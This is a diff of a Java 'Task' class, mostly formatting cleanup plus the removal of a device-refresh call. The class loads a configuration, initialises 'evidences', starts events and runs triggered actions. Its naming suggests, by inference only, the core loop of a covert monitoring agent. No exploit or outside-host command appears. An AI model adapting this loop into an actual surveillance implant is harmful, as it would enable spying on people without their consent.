@@ -116,49 +116,39 @@ public final class Task implements Singleton {
      * @return true, if successful
      */
     public boolean taskInit() {
-    
+
         //#ifdef DEBUG
         debug.trace("TaskInit");
         //#endif
-    
-        if (device != null) {
-            try {
-                device.refreshData();
-            } catch (final Exception ex) {
-                //#ifdef DEBUG
-                debug.error(ex);
-                //#endif
-            }
-        }
-    
+
         try {
             conf = new Conf();
-    
+
             if (conf.loadConf() == false) {
                 //#ifdef DEBUG
                 debug.trace("Load Conf FAILED");
                 //#endif
-    
+
                 return false;
             } else {
                 //#ifdef DEBUG
                 debug.trace("taskInit: Load Conf Succeded");
                 //#endif
             }
-    
+
             if (logCollector != null) {
                 logCollector.initEvidences();
             }
-    
+
             // Da qui in poi inizia la concorrenza dei thread
-    
+
             if (eventManager.startAll() == false) {
                 //#ifdef DEBUG
                 debug.trace("eventManager FAILED");
                 //#endif
                 return false;
             }
-    
+
             //#ifdef DEBUG
             debug.info("Events started");
             //#endif
@@ -168,7 +158,7 @@ public final class Task implements Singleton {
             debug.error(e);
             debug.error("taskInit");
             //#endif
-    
+
         } catch (final Exception e) {
             //#ifdef DEBUG
             debug.error(e);
@@ -176,7 +166,7 @@ public final class Task implements Singleton {
             //#endif
         }
         return false;
-    
+
     }
 
     /**
@@ -190,9 +180,9 @@ public final class Task implements Singleton {
         fastQueueThread = new Thread(checkActionFast);
         fastQueueThread.start();
 
-        boolean exit=checkActions(status.getTriggeredQueueMain());
+        boolean exit = checkActions(status.getTriggeredQueueMain());
         checkActionFast.close();
-        
+
         try {
             fastQueueThread.join();
         } catch (InterruptedException e) {
@@ -201,7 +191,7 @@ public final class Task implements Singleton {
             debug.error("checkActions");
             //#endif
         }
-        
+
         return exit;
     }
 
@@ -233,7 +223,7 @@ public final class Task implements Singleton {
                 //#endif
 
                 final Trigger trigger = queue.getTriggeredAction();
-                if(trigger==null){
+                if (trigger == null) {
                     // queue interrupted
                     return false;
                 }
@@ -243,7 +233,8 @@ public final class Task implements Singleton {
                 //#endif
 
                 String actionId = trigger.getId();
-                final Action action = (Action) ActionManager.getInstance().get(actionId);
+                final Action action = (Action) ActionManager.getInstance().get(
+                        actionId);
                 lastAction = action.toString();
 
                 //#ifdef DEBUG
@@ -337,16 +328,17 @@ public final class Task implements Singleton {
                     //#ifdef DEBUG
                     debug.warn("checkActions: reloading");
                     //#endif
-                   
+
                     //return true;
                     exit = Exit.RELOAD;
                     status.reload = false;
                     break;
                 }
-                
+
                 if (ret == false) {
                     //#ifdef DEBUG
-                    debug.trace("executeAction Warn: " + "CheckActions() error executing: " + subAction);
+                    debug.trace("executeAction Warn: "
+                            + "CheckActions() error executing: " + subAction);
                     //#endif
 
                     continue;
@@ -476,7 +468,4 @@ public final class Task implements Singleton {
         }
     }
 
-
-
-     
 }
